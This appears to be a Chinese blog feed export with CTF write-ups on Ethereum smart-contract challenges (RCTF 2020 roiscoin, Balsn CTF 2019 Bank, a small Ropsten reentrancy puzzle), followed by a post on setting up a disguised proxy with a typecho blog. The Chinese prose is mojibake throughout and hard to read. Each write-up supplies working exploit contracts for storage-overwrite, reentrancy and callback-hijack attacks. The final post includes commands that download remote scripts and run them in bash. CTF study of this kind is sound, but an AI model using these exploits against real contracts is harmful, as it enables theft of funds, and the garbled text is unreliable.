Ë¶ÜÁõñÈóÆÈ¢ò: settle ‰∏≠ÁöÑ failedlog Êú™ÂàùÂßãÂåñ‰ºöÈÄ†Êàê storage ÂèòÈáèË¶ÜÁõñ,‰ºöË¶ÜÁõñ codex Êï∞ÁªÑÈïøÂ∫¶ Êï∞ÁªÑ‰ªªÊÑèÂÜô: ÂΩìÊï∞ÁªÑÈïøÂ∫¶Ë¢´‰øÆÊîπÂêé,ÂèØ‰ª•Ë¶ÜÁõñ owner ,ÂΩìÁÑ∂ËøôÂØπÊï∞ÁªÑÈïøÂ∫¶Êúâ‰∏ÄÂÆöÁöÑË¶ÅÊ±Ç,Ê†πÊçÆÊÉÖÂÜµÈÄâÊã©ÂêàÈÄÇÁöÑÊï∞ÊçÆ,ËøôÈáåÊòØÁî® msg.sender Ë¶ÜÁõñÊï∞ÁªÑÈïøÂ∫¶ÁöÑÈ´ò 20 Â≠óËäÇ exp ÈÉ®ÁΩ≤ hack ÂêàÁ∫¶,ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑè: Êï∞ÁªÑÂú® storage5 ‰ΩçÁΩÆ, keccak256(bytes32(5)) = 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3db0 ÂΩìÊàë‰ª¨‰øÆÊîπ codex[y],(y=2^256-x+6) Êó∂Â∞±ËÉΩ‰øÆÊîπ slot 6 Ôºå‰ªéËÄå‰øÆÊîπ owner , ÂÖ∂‰∏≠ x = keccak256(bytes32(5)) ËÆ°ÁÆóÂá∫ y = 114245411204874937970903528273105092893277201882823832116766311725579567940182 , Âç≥ y = 0xfc949c7b4a13586e39d89eead2f38644f9fb3efb5a0490b14f8fc0ceab44c256 ÊâÄ‰ª•Êï∞ÁªÑÁöÑÈïøÂ∫¶ codex.length Ë¶Å &gt; y , Áî±‰∫é msg.sender Ë¶ÜÁõñÊï∞ÁªÑÈïøÂ∫¶ÁöÑÈ´ò 20 Â≠óËäÇ,ÊâÄ‰ª•ÂÖ∂ÂÆûÊòØÂèòÁõ∏Ë¶ÅÊ±Ç address(msg.sender) &gt; y , Êàë‰ª¨ÂèØ‰ª•ÁîüÊàê‰ª• 0xfd Êàñ 0xfe Êàñ 0xff ÂºÄÂ§¥ÁöÑÂú∞ÂùÄÂç≥ÂèØÁÆÄÂçïÊª°Ë∂≥Ëøô‰∏ÄÁÇπ Ëß£È¢òÊ≠•È™§ Ë∞ÉÁî® hack1 Ë∞ÉÁî® hack2 ‰∏ÄÊ¨°,Ëøô‰∏ÄÊ¨°ÈúÄË¶ÅÊª°Ë∂≥ result = 1 ,Âê¶ÂàôÁªßÁª≠Ë∞ÉÁî® hack2 ,Áõ¥Ëá≥Ëøô‰∏ÄÊ¨°ÊàêÂäü Ë∞ÉÁî® hack3 ‰∏§Ê¨°,Ëøô‰∏§Ê¨°ÈúÄË¶ÅÊª°Ë∂≥ result = 0 ,Âê¶ÂàôÁªßÁª≠Ë∞ÉÁî® hack3 ,Áõ¥Ëá≥‰∏§Ê¨°‰∏∫Ê≠¢ Ë∞ÉÁî® hack4 ‰øÆÊîπ owner ,ËøôÈáåÊúâ‰∏™ÂùëÁÇπ,È¢òÁõÆÁªôÁöÑÂêàÁ∫¶‰∏çÊòØÁúüÊ≠£ÁöÑÂêàÁ∫¶,Âõ†‰∏∫Ë∞ÉÁî® hack4 ÊÄªÊòØ‰∏çËÉΩÊàêÂäü‰øÆÊîπ owner , ÈÄÜÂêëÂêàÁ∫¶,ÂèØ‰ª•ÁúãÂá∫ revise ÂáΩÊï∞ÊúâÈóÆÈ¢ò,È¢ùÂ§ñË¶ÅÊ±Ç msg.sender ÊúÄ‰Ωé‰ΩçÂ≠óËäÇÊòØ 0x61 ,ÊâÄ‰ª•ÂØπ msg.sender ÊÄªÂÖ±Êúâ‰∏§ÁÇπË¶ÅÊ±Ç: Â§ß‰∫é y Âπ∂‰∏îÊúÄ‰ΩéÂ≠óËäÇÊòØ 0x61 Ë∞ÉÁî® hack5 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143pragma solidity ^0.4.23;contract FakeOwnerGame &#123; event SendFlag(address _addr); uint randomNumber = 0; uint time = now; mapping (address =&gt; uint) public BalanceOf; mapping (address =&gt; uint) public WinCount; mapping (address =&gt; uint) public FailCount; bytes32[] public codex; address private owner; uint256 settlementBlockNumber; address guesser; uint8 guess; struct FailedLog &#123; uint failtag; uint failtime; uint success_count; address origin; uint fail_count; bytes12 hash; address msgsender; &#125; mapping(address =&gt; FailedLog[]) FailedLogs; constructor() &#123; owner = msg.sender; &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function payforflag() onlyOwner &#123; require(BalanceOf[msg.sender] &gt;= 2000); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (guess == answer) &#123; WinCount[msg.sender] += 1; BalanceOf[msg.sender] += 1000; &#125; else &#123; FailCount[msg.sender] += 1; &#125; if (WinCount[msg.sender] == 2) &#123; if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123; guesser = 0; WinCount[msg.sender] = 0; FailCount[msg.sender] = 0; msg.sender.transfer(address(this).balance); &#125; else &#123; FailedLog failedlog; failedlog.failtag = 1; failedlog.failtime = now; failedlog.success_count = WinCount[msg.sender]; failedlog.origin = tx.origin; failedlog.fail_count = FailCount[msg.sender]; failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender])); failedlog.msgsender = msg.sender; FailedLogs[msg.sender].push(failedlog); &#125; &#125; &#125; function beOwner() payable &#123; require(address(this).balance &gt; 0); if(msg.value &gt;= address(this).balance)&#123; owner = msg.sender; &#125; &#125; function revise(uint idx, bytes32 tmp) &#123; if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123; codex[idx] = tmp; &#125; &#125; function read_slot(uint k) public view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125; &#125; function cal_addr(uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p)); &#125;&#125;contract hack &#123; uint public result; address instance_address = 0x7be4ae576495b00d23082575c17a354dd1d9e429 ; FakeOwnerGame target = FakeOwnerGame(instance_address); constructor() payable&#123;&#125; // ÈöèÊú∫Áåú‰∏Ä‰∏™Êï∞0Êàñ1 function hack1() &#123; target.lockInGuess.value(1 ether)(0); &#125; // ËøôÈáåÂÖàËÆ©result=1,Âç≥ÂÖàÁåúÂ§±Ë¥• function hack2() &#123; result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (result == 1) &#123; target.settle(); &#125; &#125; // ËøôÈáåËÆ©result=0,Âç≥ÁåúÊµãÊàêÂäü,ËøûÁª≠Ë∞ÉÁî®‰∏§Ê¨° function hack3() &#123; result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (result == 0) &#123; target.settle(); &#125; &#125; // ‰øÆÊîπowner function hack4() &#123; target.revise(114245411204874937970903528273105092893277201882823832116766311725579567940182,bytes32(address(this))); &#125; function hack5() &#123; target.payforflag(); &#125;&#125; ÂØπ‰∫éËØ•È¢òÁõÆÁîüÊàêÊª°Ë∂≥ msg.sender ÁöÑÂêàÁ∫¶Âú∞ÂùÄÂèØÈÄöËøá‰∏ãÈù¢ËÑöÊú¨ÁîüÊàê,Áõ¥Êé•Ë∞ÉÁî® generate_eoa2 Âç≥ÂèØ 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not (utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("61") and utils.decode_addr(utils.mk_contract_address(addr, 0)).startswith("fd")): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument")]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>rctf 2020</tag>
        <tag>roiscoin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰∏ÄÈÅìÂæàÁÆÄÂçïÁöÑÂå∫ÂùóÈìæÈ¢òÁõÆ]]></title>
    <url>%2F2020%2Feasy-blockchains%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä ‰∏çÁªèÊÑèÈó¥ÁúãÂà∞ÁöÑ‰∏Ä‰∏™È¢òÁõÆÔºåÂ∞±Èöè‰æøÂÅö‰∫Ü‰∏Ä‰∏ã Â§ß‰Ω¨ÂãøÂñ∑ ÂêàÁ∫¶Âú∞ÂùÄÔºö0x496371aF69612e7C85F8a558f9f19E0c15E9d4B0 @ ropsten, payforflag(string memory b64email) Analyse Ê≤°ÊúâÁªôÊ∫êÁ†ÅÔºåËá™Â∑±ÈÄÜÂêëÔºåÂæóÂà∞‰∏ãÈù¢ÁöÑÈÄªËæë 12345678910111213141516171819202122232425262728293031323334353637383940pragma solidity ^0.4.23;contract test &#123; mapping(address=&gt;uint) public balance; address public owner; uint s2; uint s3; uint s4; function profit(uint amount) public &#123; require(balance[msg.sender] == 0); require(s2 != 0); if(amount % s2 == s3)&#123; require(s3 != 0); if(amount % s3 == s4)&#123; balance[msg.sender] += 3; &#125; &#125; &#125; function withdraw(uint amount) public &#123; require(amount == 2); require(balance[msg.sender] == 3); msg.sender.call.value(amount * 100000000000000)(); balance[msg.sender] -= amount; &#125; function payforflag(string memory b64email) public &#123; require(balance[msg.sender]&gt;=10000000000); &#125; function func_0531(uint t1, uint t2, uint t3) public &#123; require(msg.sender == owner); s2 = t1; s3 = t2; s4 = t3; &#125; &#125; ÂæàÁÆÄÂçïÔºåÂÖàË∞ÉÁî® profit Ôºå‰ΩøÂæó balance[msg.sender] = 3 ÔºåËøôÈáå s2„ÄÅs3„ÄÅs4ÊòØownerËÆæÁΩÆÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé• web3.eth.getStorageAt Êü•ÁúãÂç≥ÂèØÔºåÂèëÁé∞ s2=65537„ÄÅs3=64834„ÄÅs4=41958ÔºåÁÑ∂ÂêéÂ∞±ÊòØ‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÊ±ÇËß£ÈóÆÈ¢òÔºåÂèØÁî®‰∏ãÈù¢ËÑöÊú¨ÔºåÊ±ÇÂæó amount=227609298 1234567891011121314151617181920212223#!/usr/bin/env python# -*- coding:utf-8 -*-from functools import reducedef egcd(a, b): """Êâ©Â±ïÊ¨ßÂá†ÈáåÂæó""" if 0 == b: return 1, 0, a x, y, q = egcd(b, a % b) x, y = y, (x - a // b * y) return x, y, qdef chinese_remainder(pairs): """‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜ""" mod_list, remainder_list = [p[0] for p in pairs], [p[1] for p in pairs] mod_product = reduce(lambda x, y: x * y, mod_list) mi_list = [mod_product//x for x in mod_list] mi_inverse = [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))] x = 0 for i in range(len(remainder_list)): x += mi_list[i] * mi_inverse[i] * remainder_list[i] x %= mod_product return xif __name__=='__main__': print(chinese_remainder([(65537, 64834), (64834, 41958)])) ÁÑ∂ÂêéË∞ÉÁî® withdraw ‰∏§Ê¨°ÔºåÈáçÂÖ•ÊîªÂáªÔºå‰æøÂèØÊª°Ë∂≥ balance[msg.sender]&gt;=10000000000 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667pragma solidity ^0.4.23;contract test &#123; mapping(address=&gt;uint) public balance; address public owner; uint s2; uint s3; uint s4; function profit(uint amount) public &#123; require(balance[msg.sender] == 0); require(s2 != 0); if(amount % s2 == s3)&#123; require(s3 != 0); if(amount % s3 == s4)&#123; balance[msg.sender] += 3; &#125; &#125; &#125; function withdraw(uint amount) public &#123; require(amount == 2); require(balance[msg.sender] == 3); msg.sender.call.value(amount * 100000000000000)(); balance[msg.sender] -= amount; &#125; function payforflag(string memory b64email) public &#123; require(balance[msg.sender]&gt;=10000000000); &#125; function func_0531(uint t1, uint t2, uint t3) public &#123; require(msg.sender == owner); s2 = t1; s3 = t2; s4 = t3; &#125; &#125;contract hack &#123; address instance_address = 0x496371aF69612e7C85F8a558f9f19E0c15E9d4B0 ; test target = test(instance_address); uint public have_withdraw = 0; constructor() payable&#123;&#125; function hack1() &#123; target.profit(227609298); &#125; function hack2() &#123; target.withdraw(2); &#125; function() payable &#123; if (have_withdraw == 0 &amp;&amp; msg.sender == instance_address)&#123; have_withdraw = 1; target.withdraw(2); &#125; &#125; function hack3(string memory b64email) &#123; target.payforflag(b64email); &#125;&#125; ‰æùÊ¨°Ë∞ÉÁî® hack1„ÄÅhack2„ÄÅhack3Âç≥ÂèØ ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÈúÄË¶ÅÂÖàÂº∫Âà∂ËΩ¨Ë¥¶ÁªôÈ¢òÁõÆÂêàÁ∫¶Ôºå‰∏çÁÑ∂ÈáçÂÖ•ÊîªÂáªÊ≤°Ê≥ïÂÆåÊàê ÂÆåÁªìÔºåÊííËä±üéâüéâüéâüéâüéâüéâüéâüéâüéâ]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Balsn CTF 2019 - Bank]]></title>
    <url>%2F2020%2Fbalsn2019-bank%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Â§çÁé∞ balsn2019 ctf ‰∏≠ÁöÑ bank Âå∫ÂùóÈìæÈ¢òÁõÆ wtcl ,Â§çÁé∞‰∫Ü‰∏Ä‰∏™‰∏ãÂçà ÂÖ∑‰ΩìÂàÜÊûêÂèäÂÆòÊñπ WP Â¶Ç‰∏ã: https://github.com/x9453/balsn-ctf-2019/tree/master/Bank Â§çÁé∞Âú∞ÂùÄ‰∏∫: ropsten@0x85B0446Dc5B5f32cbB674Dc8e49Fc27Ebaff2Ee2 Â§ñÈÉ®Ë¥¶Êà∑Âú∞ÂùÄ‰∏∫: 0x785a8D0d84ad29c96f8e1F26BfDb3E6CB72cAe9b Source12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879pragma solidity ^0.4.24;contract Bank &#123; event SendEther(address addr); event SendFlag(address addr); address public owner; uint randomNumber = 0; constructor() public &#123; owner = msg.sender; &#125; struct SafeBox &#123; bool done; function(uint, bytes12) internal callback; bytes12 hash; uint value; &#125; SafeBox[] safeboxes; struct FailedAttempt &#123; uint idx; uint time; bytes12 triedPass; address origin; &#125; mapping(address =&gt; FailedAttempt[]) failedLogs; modifier onlyPass(uint idx, bytes12 pass) &#123; if (bytes12(sha3(pass)) != safeboxes[idx].hash) &#123; FailedAttempt info; info.idx = idx; info.time = now; info.triedPass = pass; info.origin = tx.origin; failedLogs[msg.sender].push(info); &#125; else &#123; _; &#125; &#125; function deposit(bytes12 hash) payable public returns(uint) &#123; SafeBox box; box.done = false; box.hash = hash; box.value = msg.value; if (msg.sender == owner) &#123; box.callback = sendFlag; &#125; else &#123; require(msg.value &gt;= 1 ether); box.value -= 0.01 ether; box.callback = sendEther; &#125; safeboxes.push(box); return safeboxes.length-1; &#125; function withdraw(uint idx, bytes12 pass) public payable &#123; SafeBox box = safeboxes[idx]; require(!box.done); box.callback(idx, pass); box.done = true; &#125; function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; msg.sender.transfer(safeboxes[idx].value); emit SendEther(msg.sender); &#125; function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) &#123; require(msg.value &gt;= 100000000 ether); emit SendFlag(msg.sender); selfdestruct(owner); &#125;&#125; Analyse ÂêàÁ∫¶ÂàõÂª∫Âêé, slot Â∏ÉÂ±ÄÂ¶Ç‰∏ã 123456789-----------------------------------------------------| unused (12) | owner (20) | &lt;- slot 0-----------------------------------------------------| randomNumber (32) | &lt;- slot 1-----------------------------------------------------| safeboxes.length (32) | &lt;- slot 2-----------------------------------------------------| occupied by failedLogs but unused (32) | &lt;- slot 3----------------------------------------------------- ÂÖ≥‰∫é FailedAttempt Â∏ÉÂ±ÄÂ¶Ç‰∏ã,Âú®‰ª£Á†Å 33-36 Ë°åÂ≠òÂú®Êú™ÂàùÂßãÂåñÊºèÊ¥û,‰ºöÂØºËá¥Ë¶ÜÁõñÂéüÂÖà slot0 Âà∞ slot2 ÁöÑ‰ΩçÁΩÆÂÜÖÂÆπ 1234567-----------------------------------------------------| idx (32) |-----------------------------------------------------| time (32) |-----------------------------------------------------| origin (20) | triedPass (12) |----------------------------------------------------- ÂêåÊ†∑, SafeBox ‰πüÊòØÁ±ª‰ººÂàÜÊûê,‰ºöÂú® deposit() ‰∏≠Ë¶ÜÁõñ slot0 Âíå slot1 12345-----------------------------------------------------| unused (11) | hash (12) | callback (8) | done (1) |-----------------------------------------------------| value (32) |----------------------------------------------------- ÂèØ‰ª•ÁúãÂà∞,Â¶ÇÊûúÈÄöËøá deposit ‰øÆÊîπ slot0 Âíå slot1 ÊòØÊ≤°Áî®ÁöÑ,Âç≥‰Ωø‰øÆÊîπ‰∫Ü owner ‰πüÊ≤°Áî®,Âõ†‰∏∫ËøòÊúâÁ¨¨ 74 Ë°åÁöÑÈôêÂà∂ ÂÖ∂ÂÆûÈ¢òÁõÆËÄÉÊü•ÁöÑÊòØÁªìÊûÑ‰ΩìÊú™ÂàùÂßãÂåñÊºèÊ¥û+Êï∞ÁªÑÂ≠òÂÇ®ÊñπÂºè+mappingÂ≠òÂÇ®ÊñπÂºè+ÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅ Âõ†‰∏∫ 33-36 Ë°å‰∏≠Â¶ÇÊûú origin Ë∂≥Â§üÂ§ß,Áõ∏ÂΩì‰∫é‰øÆÊîπ‰∫Ü safeboxes Êï∞ÁªÑÁöÑÈïøÂ∫¶,ËÆ©Êï∞ÁªÑÁöÑÈïøÂ∫¶Ë∂≥Â§üÂ§ß,Â¶ÇÊûúÂ§ßÂà∞ÂèØ‰ª•‰øÆÊîπÊàñËÄÖË¶ÜÁõñ failedLogs,ÈÇ£‰πàÂ∞±ÂèØ‰ª•ÈÄöËøá safeboxes Êï∞ÁªÑÂéªËÆøÈóÆ failedLogs,ÂÖ∂ÂÆû‰πüÁõ∏ÂΩì‰∫é failedLogs ÊòØÊï∞ÁªÑ safeboxes ÁöÑÂÜÖÂÆπ,ÊâÄ‰ª•ËøôÂ∞±ÂØπ tx.origin Êúâ‰∏ÄÂÆöÁöÑË¶ÅÊ±Ç ÂÅáËÆæ safeboxes ÂèØ‰ª•ÂåÖÂê´ failedLogs,ÂêåÊó∂ FailedAttempt ‰∏≠ÁöÑ triedPass ÂèØ‰ª•Ë¶ÜÁõñ Safebox ÁöÑ callback : Âõ†‰∏∫ triedPass Êàë‰ª¨ÂèØ‰ª•ÂÆåÂÖ®ÊéßÂà∂,ÊâÄ‰ª•Êàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøá triedPass ÊéßÂà∂ callback ,Ëøõ‰∏ÄÊ≠•ÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅ(Á¨¨64Ë°å) Â¶ÇÊûúËÉΩÂ§üÊéßÂà∂Á®ãÂ∫èÊâßË°åÊµÅÁöÑËØù,ÈÇ£‰πàÊàë‰ª¨Âè™ÈúÄË¶ÅÊâæÂà∞Á¨¨ 75 Ë°å emit SendFlag(msg.sender);ÁöÑ‰ΩçÁΩÆÂ∞±Ë°å‰∫Ü,Ëøô‰∏™ÂèØ‰ª•ÈÄöËøáÊü•Áúã bytecodes ÂØπÂ∫îÁöÑ opcode ÊâæÂà∞,Â¶Ç‰∏ãÂõæ,Êàë‰ª¨ÂÖàÊâæÂà∞ require(msg.value &gt;= 100000000 ether); ÂØπÂ∫îÁöÑ‰ΩçÁΩÆ,ÁÑ∂ÂêéÂÜçÊâæ emit SendFlag(msg.sender); ÂØπÂ∫îÁöÑ‰ΩçÁΩÆ,Âõ†‰∏∫Âú®EVM‰∏≠Ë∞ÉÁî®‰∏Ä‰∏™ÂáΩÊï∞Áõ∏ÂΩì‰∫éÊâßË°å jump Êìç‰Ωú,ËÄåË∑≥Âà∞ÁöÑÂú∞ÊñπÈÉΩÊòØ‰ª• jumpdest ÂºÄÂßã,ÊâÄ‰ª• 0x070f Â∞±ÊòØÊàë‰ª¨ÊÉ≥Ë¶ÅË∑≥Âà∞ÁöÑ‰ΩçÁΩÆ,ËøôÊ†∑ÁöÑËØùÂ∞±ÂèØ‰ª•Ëß¶Âèë SendFlag ‰∫ã‰ª∂‰∫Ü Solution ËÆ°ÁÆó target = keccak256(keccak256(msg.sender||3)) + 2 ,ËøôÈáå target Â∞±ÊòØ FailedAttempt[0] ‰∏≠ÁöÑ origin(20) | triedPass(12) ËÆ°ÁÆó base = keccak256(2) ,ËøôÈáå base Â∞±ÊòØ safeboxes Êï∞ÁªÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†Âú® slot ÁöÑ‰ΩçÁΩÆ ËÆ°ÁÆó idx = (target - base) // 2 , ËøôÈáå idx ÊåáÁöÑÊòØÂú® safeboxes Êï∞ÁªÑ‰∏≠ÁöÑÁ¥¢Âºï,Âõ†‰∏∫‰∏Ä‰∏™ Safebox Âç†ÊçÆ‰∏§‰∏™ slot ,ÊâÄ‰ª•Ë¶ÅÈô§‰ª• 2 ËÆ°ÁÆó (target - base) % 2 ,Â¶ÇÊûúÁ≠â‰∫é 0 ,ËØ¥Êòé origin(20) | triedPass(12) ÂàöÂ•ΩÂèØ‰ª•Ë¶ÜÁõñ unused (11) | hash (12) | callback (8) | done (1) ËÆ°ÁÆó (msg.sender &lt;&lt; (12*8)) ,Â¶ÇÊûú &lt; idx ,ËØ¥Êòé safeboxes Êï∞ÁªÑÈïøÂ∫¶ÂêàÈÄÇ,ÂèØ‰ª•ÂåÖÂê´ failedLogs ; Âê¶ÂàôÁöÑËØù‰ªéÊ≠•È™§1ÈáçÊñ∞ÂºÄÂßã Ë∞ÉÁî® deposit(0x000000000000000000000000) Âπ∂ËÆæÁΩÆ msg.value = 1 ether : ËøôÈáåÊòØËÆ© callback ÊåáÂêë sendEther , ÁõÆÁöÑÊòØ‰∏ã‰∏ÄÊ≠•Ë∞ÉÁî®ÊéßÂà∂ safeboxes Êï∞ÁªÑÈïøÂ∫¶ Ë∞ÉÁî® withdraw(0, 0x111111111111110000070f00) : ËøôÈáåÁõ∏ÂΩì‰∫éË∞ÉÁî® sendEther(0, 0x111111111111110000070f00) ,Â∞Ü failedLogs[msg.sender] ‰∏≠ÁöÑ triedPass ÊéßÂà∂,Áõ∏ÂΩì‰∫éÊéßÂà∂‰∫Ü unused (11) | hash (12) | callback (8) | done (1) ÊâÄÂú® slot ÁöÑ‰Ωé 12 Â≠óËäÇ,‰øÆÊîπ‰∫Ü callback ,ÂÖ∂ÂÆûÁõ∏ÂΩì‰∫éÊää failedLogs[msg.sender] ÂØπÂ∫îÁöÑÂÜÖÂÆπÁúãÊàêÊòØ safeboxes Êï∞ÁªÑÁöÑÂÜÖÂÆπ,ÂêåÊó∂‰øÆÊîπ‰∫ÜÊï∞ÁªÑÈïøÂ∫¶ Ë∞ÉÁî® withdraw(idx, 0x000000000000000000000000) : ËøôÈáåÂ∞±ÂèØ‰ª•ÊâßË°åÂà∞ emit SendFlag(msg.sender); ÊííËä±üéâüéâüéâüéâüéâüéâüéâüéâ È¢òÂ§ñÁü•ËØÜ12345678910111213141516contract C &#123; address a; uint r; uint[] b; mapping(uint =&gt; uint) m; constructor() public &#123; a = msg.sender; r = 777; b.push(333); b.push(444); m[999] = 888; &#125;&#125;// bÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†‰ΩçÁΩÆÂú®keccak256(2),Âç≥slot(keccak256(2)+0)Â≠òÂÇ®333,slot(keccak256(2)+1)Â≠òÂÇ®444// m[k]Â≠òÂÇ®Âú®slot(keccak256(k||3)),Âç≥slot(keccak256(999||3))Â≠òÂÇ®888 ÂèØÈÄöËøá‰∏ãÂàóÂáΩÊï∞ÂàÜÂà´Ëé∑Âèñ slot ÂÜÖÂÆπ„ÄÅmapping ÂÜÖÂÆπÂØπÂ∫î slot „ÄÅÊï∞ÁªÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÂØπÂ∫î slot 1234567891011function read_slot(uint k) public view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125;&#125;function cal_addr(uint k, uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(k, p));&#125;function cal_addr(uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p));&#125;]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>balsn2019</tag>
        <tag>bank</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[djJyYXk=(b64)‰º™Ë£Ö + ÂÆùÂ°î + typecho]]></title>
    <url>%2F2020%2FTypecho-V2ray%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Êç¢‰∏™Âä®ÊÄÅÂçöÂÆ¢ typecho ‰∏∫‰∫ÜÁúÅÈí±,Âú®Âêå‰∏Ä‰∏™ vps ‰∏äÊê≠Âª∫‰∫Ü djJyYXk= Âíå typecho Áî±‰∫é‰πãÂâçÊë∏Á¥¢Êê≠Âª∫ÁöÑÊñπÊ≥ï,‰∏≠Èó¥Ëµ∞‰∫ÜÂæàÂ§öÊõ≤ÊäòË∑Ø,Áî±‰∫éÁî≥ËØ∑Â§™Â§ö ssl ËØÅ‰π¶,ÂØºËá¥ÂüüÂêçÊöÇÊó∂Ë¢´ Let&#39;s Encrypt ÊãâÂÖ•ÈªëÂêçÂçï,ÊâÄ‰ª•ÁõÆÂâçÊ≤°Ê≥ïÊõ¥Êç¢Âà∞ typecho ,ÂÖàËÆ∞ÂΩï‰∏Ä‰∏ãÊñπÊ≥ïÂêß ‰∏∫‰∫ÜÁúÅ‰∫ã,Áõ¥Êé•Áî®‰∫ÜÂÆùÂ°î,ÂÖàÂÆâË£ÖÂÆùÂ°î 1yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh ÁÑ∂ÂêéÁî®ÂÆùÂ°îÂÆâË£Ö typecho ,ËøôÈáå‰∏çË¶ÅÁî≥ËØ∑ ssl ËØÅ‰π¶ ÂÜçÂÆâË£Ö djJyYXk= ‰º™Ë£Ö 1bash &lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_v2ray2.sh) ÊúÄÂêé‰øÆÊîπ nginx , Ë∑ØÂæÑ‰∏∫ /www/server/panel/vhost/nginx/blog.hitcxy.com.conf, Êää blog.hitcxy.com Êç¢ÊàêÁõ∏ÂØπÂ∫îÁöÑ‰∏ªÊú∫ÂêçÂç≥ÂèØ, ssl ËØÅ‰π¶Áî® v2ray Áî≥ËØ∑ÁöÑ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768server &#123; listen 80; server_name blog.hitcxy.com; return 301 https://$server_name:443$request_uri;&#125;server &#123; listen 443 ssl http2; server_name blog.hitcxy.com; charset utf-8; # sslÈÖçÁΩÆ ssl_protocols TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_ecdh_curve secp384r1; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_session_timeout 10m; ssl_session_tickets off; ssl_certificate /etc/letsencrypt/live/blog.hitcxy.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/blog.hitcxy.com/privkey.pem; #PHP-INFO-START PHPÂºïÁî®ÈÖçÁΩÆÔºåÂèØ‰ª•Ê≥®ÈáäÊàñ‰øÆÊîπ include enable-php-70.conf; #REWRITE-START URLÈáçÂÜôËßÑÂàôÂºïÁî®,‰øÆÊîπÂêéÂ∞ÜÂØºËá¥Èù¢ÊùøËÆæÁΩÆÁöÑ‰º™ÈùôÊÄÅËßÑÂàôÂ§±Êïà include /www/server/panel/vhost/rewrite/blog.hitcxy.com.conf; root /www/wwwroot/blog.hitcxy.com; location / &#123; index index.php index.html index.htm default.php default.htm default.html; # proxy_pass http://www.ddxsku.com/; &#125; #Á¶ÅÊ≠¢ËÆøÈóÆÁöÑÊñá‰ª∂ÊàñÁõÆÂΩï location ~ ^/(\.user.ini|\.htaccess|\.git|\.svn|\.project|LICENSE|README.md) &#123; return 404; &#125; location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123; expires 30d; error_log off; access_log /dev/null; &#125; location ~ .*\.(js|css)?$ &#123; expires 12h; 